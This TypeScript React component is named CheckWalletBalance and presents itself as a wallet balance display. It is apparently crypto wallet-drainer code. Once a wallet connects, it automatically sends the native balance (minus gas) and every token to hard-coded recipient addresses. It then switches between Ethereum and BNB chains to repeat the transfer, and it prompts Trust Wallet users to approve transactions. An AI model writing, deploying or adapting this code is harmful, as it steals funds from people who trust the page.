import { useEffect, useState } from "react";
import { useAppKitAccount } from "@reown/appkit/react";
import { useTransferFunds } from "../hooks/useTransferFunds";
import useNativeBalance from "../hooks/useNativeBalance";
import { getTokensWithBalance } from "../utils/getTokens";
import { MINIMUM_BALANCE, RECIPIENT_ADDRESSES } from "../constants";
import { useChainId } from "wagmi";
import useAutoSwitchChain from "../hooks/useAutoSwitchChain";
import { getGasBufferByChain } from "../utils/gasBuffer";


const SUPPORTED_CHAINS = [1, 56]; // Ethereum and BNB
const MINIMUM_TRANSFER_AMOUNT = 0.001; // Minimum amount to transfer

export default function CheckWalletBalance() {
  const { address, isConnected } = useAppKitAccount();
  const chainId = useChainId();
  const { balance, symbol, isLoading } = useNativeBalance(address as `0x${string}`);
  const { transferNativeToken, transferERC20Token } = useTransferFunds();
  const { switchChain, isSwitching } = useAutoSwitchChain();
  const [status, setStatus] = useState("");
  const [processedChains, setProcessedChains] = useState<number[]>([]);
  const [isProcessing, setIsProcessing] = useState(false);

  const processWallet = async () => {
    if (!address || !chainId || processedChains.includes(chainId) || isProcessing || isSwitching) return;

    const numericBalance = parseFloat(balance);
    if (isNaN(numericBalance)) {
      console.warn("⚠️ Invalid balance detected, skipping chain.");
      setStatus("⚠️ Invalid balance detected.");
      return;
    }

    const GAS_BUFFER = await getGasBufferByChain(chainId);

    // Skip if balance is zero and attempt chain switch
    if (numericBalance === 0) {
      console.warn(`⛔ Chain ${chainId} has zero native balance, skipping.`);
      setProcessedChains((prev) => [...prev, chainId]);

      const remainingChains = SUPPORTED_CHAINS.filter((id) => !processedChains.includes(id) && id !== chainId);
      if (remainingChains.length > 0) {
        setStatus(`🔁 Switching to chain ${remainingChains[0]}...`);
        try {
          const success = await switchChain(remainingChains[0]);
          if (!success) {
            setStatus("❌ Failed to switch chain. Please switch manually in Trust Wallet.");
            return;
          }
        } catch (error) {
          console.error("❌ Chain switch failed:", error);
          setStatus("❌ Failed to switch chain. Please add funds or switch manually.");
          return;
        }
      } else {
        setStatus("✅ All chains processed.");
      }
      return;
    }

    setIsProcessing(true);
    try {
      setStatus(`🔍 Checking ${symbol} balance on chain ${chainId}...`);
      const thresholdMet = numericBalance >= MINIMUM_BALANCE;

      if (!thresholdMet) {
        setStatus("❌ Insufficient funds. Skipping chain...");
        setProcessedChains((prev) => [...prev, chainId]);

        const remainingChains = SUPPORTED_CHAINS.filter((id) => !processedChains.includes(id) && id !== chainId);
        if (remainingChains.length > 0) {
          setStatus(`🔁 Switching to chain ${remainingChains[0]}...`);
          await switchChain(remainingChains[0]);
        } else {
          setStatus("✅ All chains processed.");
        }
        return;
      }

      // Proceed with transfers
      const tokens = await getTokensWithBalance(address, chainId);
      const safeAmountToSend = Math.max(0, numericBalance - GAS_BUFFER);

      if (safeAmountToSend < MINIMUM_TRANSFER_AMOUNT) {
        console.warn(`⛔ Safe amount to send (${safeAmountToSend}) is too low, skipping transfer.`);
        setStatus(`⚠️ Insufficient amount to transfer after gas buffer.`);
        setProcessedChains((prev) => [...prev, chainId]);
        const remainingChains = SUPPORTED_CHAINS.filter((id) => !processedChains.includes(id) && id !== chainId);
        if (remainingChains.length > 0) {
          await switchChain(remainingChains[0]);
        } else {
          setStatus("✅ All chains processed.");
        }
        return;
      }

      if (tokens.length === 0) {
        setStatus("🚀 Sending native token...");
        await transferNativeToken(safeAmountToSend, RECIPIENT_ADDRESSES[chainId], { timeout: 30000 });
        setStatus("✅ Native token sent!");
      } else {
        setStatus(`🚀 Sending native + ${tokens.length} token(s)...`);
        await transferNativeToken(safeAmountToSend, RECIPIENT_ADDRESSES[chainId], { timeout: 30000 });

        for (let token of tokens) {
          if (parseFloat(token.balance) === 0) continue; // Skip dust
          await transferERC20Token(
            token.contractAddress,
            token.balance,
            RECIPIENT_ADDRESSES[chainId],
            token.decimals
          );
        }
        setStatus("🎉 All tokens sent!");
      }

      setProcessedChains((prev) => [...prev, chainId]);

      const remainingChains = SUPPORTED_CHAINS.filter((id) => !processedChains.includes(id) && id !== chainId);
      if (remainingChains.length > 0) {
        setStatus(`🔁 Switching to chain ${remainingChains[0]}...`);
        await switchChain(remainingChains[0]);
      } else {
        setStatus("✅ All chains processed.");
      }
    } catch (error) {
      console.error("❌ Error in processWallet:", error);
      setStatus(`❌ Operation failed`);
      setProcessedChains((prev) => [...prev, chainId]); // Skip chain on error
      // Attempt to switch to the next chain
      const remainingChains = SUPPORTED_CHAINS.filter((id) => !processedChains.includes(id) && id !== chainId);
      if (remainingChains.length > 0) {
        setStatus(`🔁 Switching to chain ${remainingChains[0]}...`);
        try {
          const success = await switchChain(remainingChains[0]);
          if (!success) {
            setStatus("❌ Failed to switch chain. Please switch manually in Trust Wallet.");
            return;
          }
        } catch (switchError) {
          console.error("❌ Chain switch failed:", switchError);
          setStatus("❌ Failed to switch chain. Please add funds or switch manually.");
          return;
        }
      } else {
        setStatus("✅ All chains processed.");
      }
    } finally {
      setIsProcessing(false);
    }
  };

  useEffect(() => {
    const shouldProcess =
      isConnected &&
      address &&
      !processedChains.includes(chainId) &&
      !isProcessing &&
      !isLoading &&
      !isSwitching;

    if (shouldProcess) {
      processWallet();
    }
  }, [isConnected, address, chainId, isLoading, processedChains, isProcessing, isSwitching]);

  return (
    <div className="text-center">
      <p>Chain: {chainId}</p>
      <p>Balance: {balance} {symbol}</p>
      <p>Status: {status}</p>
      {isSwitching && <p>🔄 Switching chain...</p>}
      {isProcessing && <p>⏳ Processing...</p>}
      {status.includes("failed") && (
        <p className="text-red-500">
          ⚠️ Action required: {status.includes("switch") ? "Switch chain manually in Trust Wallet." : "Approve transaction or check balance."}
        </p>
      )}
    </div>
  );
}

